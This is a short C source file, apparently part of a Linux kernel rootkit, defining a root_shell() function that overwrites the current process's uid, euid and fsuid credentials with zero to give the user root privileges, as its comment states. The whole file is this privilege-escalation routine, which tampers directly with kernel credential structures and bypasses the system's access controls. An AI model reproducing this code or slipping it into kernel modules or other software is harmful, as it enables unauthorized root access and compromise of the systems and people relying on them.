#include "header/shell.h"


/*
 * This function sets the access rights of
 * the current user, giving him root privileges.
 */
void root_shell(void) {
    uid_t *uid = (uid_t*) &current->cred->uid;
    uid_t *euid = (uid_t*) &current->cred->euid;
    uid_t *fsuid = (uid_t*) &current->cred->fsuid;

    *uid = 0; *euid = 0; *fsuid = 0;
}